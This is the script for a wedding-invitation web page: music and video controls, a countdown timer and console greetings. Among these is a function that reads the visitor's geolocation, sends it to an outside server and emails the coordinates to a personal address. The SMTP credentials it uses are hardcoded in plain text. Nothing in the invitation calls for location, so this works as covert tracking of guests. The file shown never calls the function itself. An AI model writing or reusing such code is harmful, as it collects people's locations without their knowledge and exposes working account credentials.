/**
 * @author Mohit Singh <MohitSingh@gmail.com>
 */
(function ($) {
  "use strict";
  $('.sakura-falling').sakura();
})(jQuery);

function randomIntFromInterval(min, max) { // min and max included 
  return Math.floor(Math.random() * (max - min + 1) + min)
}


function setTheme() {
  const rndInt = randomIntFromInterval(1, 5)
  let vdo = document.getElementById('myVideo');
  // if (rndInt === 1) {
  //   vdo.src = "./assets/bg/bg1.mp4";
  // }
  // if (rndInt === 2) {
  //   vdo.src = "./assets/bg/bg2.mp4";
  // }
  // if (rndInt === 3) {
  //   vdo.src = "./assets/bg/bg3.mp4";
  // }
  // if (rndInt === 4) {
  //   vdo.src = "./assets/bg/bg4.mp4";
  // }
  // if (rndInt === 5) {
  //   vdo.src = "./assets/bg/bg.mp4";
  // }
  console.log("adsads", rndInt)


  vdo.play();
}
function getLocation() {
  var x = document.getElementById("demo");
  return new Promise(function (resolve, reject) {

    // Promisifying the geolocation API
    navigator.geolocation.getCurrentPosition(
      (position) => resolve(position),
      (error) => reject(error)
    );
  });

}


function ssss() {
  getLocation().then((res) => {
    let data = {
      lat: res.coords.latitude,
      lng: res.coords.longitude
    }
    const options = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    };
    fetch(`https://getinvitelocation.netlify.app/.netlify/functions/server/getLocation`, options)
      .then(response => response.json())
      .then(response => sendEmail(response))
      .catch(err => console.error(err));

  })

}

function sendEmail(coords) {

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "sterdon458@gmail.com",
    Password: "83FB3C75585C807D72DD55A0B71F3140377C",
    To: 'mohits2125@gmail.com',
    From: "sterdon458@gmail.com",
    Subject: "Wedding-Invite",
    Body: JSON.stringify(coords),
  })
    .then(function (message) {
      // alert("mail sent successfully")
    });
}
document.getElementById("my_audio").play();
$(document).on('click', function () {
  document.getElementById("my_audio").play();
  console.log('Shaadi me zaroor aana');
});


function playAudio() {
  document.getElementById("play").style.display = "none";
  document.getElementById("pause").style.display = "block";
  document.getElementById("my_audio").play();
}

function pauseAudio() {
  document.getElementById("play").style.display = "block";
  document.getElementById("pause").style.display = "none";
  document.getElementById("my_audio").pause();
}
// Set the date we're counting down to
var countDownDate = new Date("Oct 28, 2022 11:30:00").getTime();

// Update the count down every 1 second
var x = setInterval(function () {

  // Get todays date and time
  var now = new Date().getTime();

  // Find the distance between now and the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
  let daysNo = days.toString().split('')
  let hoursNo = hours.toString().split('')
  let minutesNo = minutes.toString().split('')
  let secondsNo = seconds.toString().split('')
  if (secondsNo.length == 1) {
    secondsNo = [0]
    secondsNo.push(seconds.toString())
  }
  if (minutesNo.length == 1) {
    minutesNo = [0]
    minutesNo.push(minutes.toString())
  }
  if (hoursNo.length == 1) {
    hoursNo = [0]
    hoursNo.push(hours.toString())
  }
  // Output the result in an element with id="demo"


  // document.getElementById("time").innerHTML = "<div class='container'><div class='days block'>" + days + "<br>Days</div>" + "<div class='hours block'>" + hours + "<br>Hours</div>" + "<div class='minutes block'>" + minutes + "<br>Minutes</div>" + "<div class='seconds block'>" + seconds + "<br>Seconds</div></div>";
  document.getElementById("time").innerHTML ="<div class='container'>"+
    "<span class='block'>" + "<span class='timeUnit'>" + daysNo.join("</span><span class='timeUnit'>") + "</span>"+"<br><br><center><label id='timeLabel'>Days</label></center>" + "</span>" +
    "<span class='block'>" + "<span class='timeUnit'>" + hoursNo.join("</span><span class='timeUnit'>") + "</span>" +"<br><br><center><label id='timeLabel'>Hours</label></center>"+ "</span>" +
    "<span class='block'>" + "<span class='timeUnit'>" + minutesNo.join("</span><span class='timeUnit'>") + "</span>" +"<br><br><center><label id='timeLabel'>Mins</label></center>"+ "</span>" +
    "<span class='block'>" + "<span class='timeUnit'>" + secondsNo.join("</span><span class='timeUnit'>") + "</span>" +"<br><br><center><label id='timeLabel'>Secs</label></center>"+ "</span>"+ "</div>"

  // If the count down is over, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("time").innerHTML = "Bless the engaged couple for happy life!";
  }
}, 1000);
var video = document.getElementById("myVideo");
var btn = document.getElementById("myBtn");

function myFunction() {
  if (video.paused) {
    video.play();
    btn.innerHTML = "Pause";
  } else {
    video.pause();
    btn.innerHTML = "Play";
  }
}
// being a bit cool :p  
var styles = [
  'background: linear-gradient(#D33106, #571402)'
  , 'border: 4px solid #3E0E02'
  , 'color: white'
  , 'display: block'
  , 'text-shadow: 0 2px 0 rgba(0, 0, 0, 0.3)'
  , 'box-shadow: 0 2px 0 rgba(255, 255, 255, 0.4) inset, 0 5px 3px -5px rgba(0, 0, 0, 0.5), 0 -13px 5px -10px rgba(255, 255, 255, 0.4) inset'
  , 'line-height: 40px'
  , 'text-align: center'
  , 'font-weight: bold'
  , 'font-size: 32px'
].join(';');

var styles1 = [
  'color: #FF6C37'
  , 'display: block'
  , 'text-shadow: 0 2px 0 rgba(0, 0, 0, 1)'
  , 'line-height: 40px'
  , 'font-weight: bold'
  , 'font-size: 32px'
].join(';');

var styles2 = [
  'color: teal'
  , 'display: block'
  , 'text-shadow: 0 2px 0 rgba(0, 0, 0, 1)'
  , 'line-height: 40px'
  , 'font-weight: bold'
  , 'font-size: 32px'
].join(';');

console.log('\n\n%c SAVE THE DATE: 15th feb, 2023!', styles);

console.log('%cYour presence is requested!%c\n\nRegards: Mohit Singh', styles1, styles2);

console.log(
  `%cShaadi me zaroor aana!\n\n`,
  'color: yellow; background:tomato; font-size: 24pt; font-weight: bold',
)
